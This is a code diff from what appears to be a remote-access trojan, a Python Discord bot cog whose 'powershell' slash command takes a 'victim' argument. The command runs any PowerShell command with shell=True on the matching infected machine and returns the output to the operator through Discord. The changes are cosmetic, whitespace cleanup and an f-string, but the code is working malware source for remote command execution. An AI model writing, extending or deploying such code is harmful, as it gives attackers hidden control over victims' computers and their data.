@@ -50,7 +50,7 @@ class Shell(commands.Cog):
             await ctx.followup.send(embed=embed)
 
     @commands.slash_command( )
-    async def powershell(self, ctx, victim, command): 
+    async def powershell(self, ctx, victim, command):
         """[EXPERIMENTAL] Executes powershell commands
         
         Parameters
@@ -60,15 +60,15 @@ class Shell(commands.Cog):
         """
         if str(victim) == str(self.bot.identifier):
             await ctx.response.defer()
-            
+
             output = subprocess.run(
-                "powershell.exe "+command, 
+                f"powershell.exe {command}",
                 shell=True,
-                stdin=subprocess.PIPE, 
+                stdin=subprocess.PIPE,
                 stderr=subprocess.PIPE,
-                stdout=subprocess.PIPE, 
+                stdout=subprocess.PIPE,
             ).stdout.decode('utf-8')
-            
+
             if len(output) > 4095:  
                 output_bytes = BytesIO(
                     bytes(
@@ -80,7 +80,7 @@ class Shell(commands.Cog):
                         output_bytes, filename = "output.txt"
                     )   
                 )       
-                
+
             embed = self.bot.genEmbed(
                 f"Output for `{command}`:",
                 datetime.now(),
